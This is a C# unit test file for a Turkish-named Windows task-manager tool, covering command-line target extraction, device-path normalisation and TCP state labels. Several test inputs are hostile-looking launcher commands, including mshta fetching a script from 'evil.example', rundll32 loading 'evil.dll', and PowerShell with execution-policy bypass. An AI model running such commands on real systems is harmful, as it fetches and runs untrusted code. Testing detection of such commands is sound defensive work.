using GorevYoneticisi.Core;
using GorevYoneticisi.Core.Metrics;

namespace GorevYoneticisi.Core.Tests;

public class CommandLineTests
{
    [Theory]
    [InlineData("\"C:\\Program Files\\App\\app.exe\" --tray", @"C:\Program Files\App\app.exe")]
    [InlineData(@"C:\Tools\tool.exe /silent", @"C:\Tools\tool.exe")]
    [InlineData(@"C:\Program Files\My App\app.exe /s", @"C:\Program Files\My App\app.exe")]
    [InlineData(@"C:\exefiles\a.exe -x", @"C:\exefiles\a.exe")]
    [InlineData(@"C:\x\y.exe", @"C:\x\y.exe")]
    [InlineData(@"""C:\x\a.bat""", @"C:\x\a.bat")]
    [InlineData(@"C:\scripts\run.cmd arg", @"C:\scripts\run.cmd")]
    [InlineData(@"C:\Program Files\Foo\drv.sys", @"C:\Program Files\Foo\drv.sys")]
    [InlineData(@"notepad", "notepad")]
    public void ExtractsExecutablePath(string command, string expected)
    {
        Assert.Equal(expected, CommandLine.ExtractTarget(command));
    }

    [Theory]
    [InlineData(@"rundll32.exe C:\Users\a\evil.dll,Start", @"C:\Users\a\evil.dll")]
    [InlineData(@"C:\Windows\System32\rundll32.exe ""C:\p q\lib.dll"",Entry", @"C:\p q\lib.dll")]
    [InlineData(@"rundll32 shell32.dll,Control_RunDLL", "shell32.dll")]
    [InlineData(@"%windir%\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations", "acproxy.dll")]
    [InlineData(@"rundll32.exe C:\p q\lib.dll,Entry", @"C:\p q\lib.dll")]
    [InlineData(@"regsvr32 /s /i C:\x\y.dll", @"C:\x\y.dll")]
    [InlineData(@"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\s\a.ps1""", @"C:\s\a.ps1")]
    [InlineData(@"wscript //B C:\x\run.vbs", @"C:\x\run.vbs")]
    [InlineData(@"cmd.exe /c C:\x\start.bat", @"C:\x\start.bat")]
    [InlineData(@"C:\Windows\System32\mshta.exe http://evil.example/a.hta", "http://evil.example/a.hta")]
    public void ForScriptHosts_ReturnsTheScriptOrDll(string command, string expected)
    {
        Assert.Equal(expected, CommandLine.ExtractTarget(command));
    }

    [Theory]
    [InlineData(@"powershell.exe -NoProfile -EncodedCommand AAAA", "powershell.exe")]
    [InlineData(@"cmd /c echo hi", "cmd")]
    public void ForScriptHostsWithoutFile_ReturnsTheHost(string command, string expected)
    {
        Assert.Equal(expected, CommandLine.ExtractTarget(command));
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    public void EmptyCommandReturnsNull(string? command)
    {
        Assert.Null(CommandLine.ExtractTarget(command));
    }
}

public class HistoryTests
{
    [Fact]
    public void KeepsOnlyTheMostRecentValues()
    {
        var h = new History(3);
        foreach (var v in new[] { 1.0, 2, 3, 4, 5 }) h.Add(v);
        Assert.Equal(new[] { 3.0, 4, 5 }, h.ToArray());
        Assert.Equal(5.0, h.Latest);
    }

    [Fact]
    public void EmptyHistory()
    {
        var h = new History(3);
        Assert.Empty(h.ToArray());
        Assert.Equal(0, h.Latest);
    }
}

public class TcpStateTests
{
    [Theory]
    [InlineData(2, "Dinliyor")]
    [InlineData(5, "Bağlı")]
    [InlineData(99, "Bilinmiyor")]
    public void MapsToTurkish(int state, string expected)
    {
        Assert.Equal(expected, TcpStates.ToTurkish(state));
    }
}

public class DevicePathTests
{
    private static readonly Dictionary<string, string> Empty = new();

    [Fact]
    public void ConvertsNtDevicePathToDosPath()
    {
        var map = new Dictionary<string, string> { [@"\Device\HarddiskVolume3"] = "C:" };
        Assert.Equal(@"C:\Windows\x.exe", DevicePaths.ToDosPath(@"\Device\HarddiskVolume3\Windows\x.exe", map));
    }

    [Fact]
    public void DoesNotMatchPrefixOfLongerVolumeName()
    {
        var map = new Dictionary<string, string> { [@"\Device\HarddiskVolume1"] = "D:", [@"\Device\HarddiskVolume12"] = "E:" };
        Assert.Equal(@"E:\a.exe", DevicePaths.ToDosPath(@"\Device\HarddiskVolume12\a.exe", map));
    }

    [Theory]
    [InlineData(@"\??\C:\Windows\x.exe", @"C:\Windows\x.exe")]
    [InlineData(@"\SystemRoot\System32\drivers\x.sys", @"C:\Windows\System32\drivers\x.sys")]
    [InlineData(@"C:\already\dos.exe", @"C:\already\dos.exe")]
    [InlineData(@"\??\UNC\srv\share\a.exe", @"\\srv\share\a.exe")]
    [InlineData(@"\\?\UNC\srv\share\a.exe", @"\\srv\share\a.exe")]
    [InlineData(@"\Device\Mup\srv\share\a.exe", @"\\srv\share\a.exe")]
    [InlineData(@"\Device\LanmanRedirector\;Z:0000000000012345\srv\share\a.exe", @"\\srv\share\a.exe")]
    [InlineData(@"\\.\C:\x.exe", @"C:\x.exe")]
    public void NormalizesCommonPrefixes(string input, string expected)
    {
        Assert.Equal(expected, DevicePaths.ToDosPath(input, Empty, windowsDirectory: @"C:\Windows"));
    }

    [Theory]
    [InlineData(@"%SystemRoot%\system32\svchost.exe", @"C:\Windows\system32\svchost.exe")]
    [InlineData(@"System32\drivers\x.sys", @"C:\Windows\System32\drivers\x.sys")]
    [InlineData(@"syswow64\a.dll", @"C:\Windows\syswow64\a.dll")]
    [InlineData(@"\Windows\x.exe", @"C:\Windows\x.exe")]
    [InlineData(@"\SystemRoot\x.sys", @"C:\Windows\x.sys")]
    [InlineData(@"""C:\q\a.exe""", @"C:\q\a.exe")]
    public void NormalizeImagePath_HandlesRegistryStyles(string input, string expected)
    {
        string Expand(string s) => s.Replace("%SystemRoot%", @"C:\Windows", StringComparison.OrdinalIgnoreCase);
        Assert.Equal(expected, DevicePaths.NormalizeImagePath(input, Empty, @"C:\Windows", Expand));
    }
}
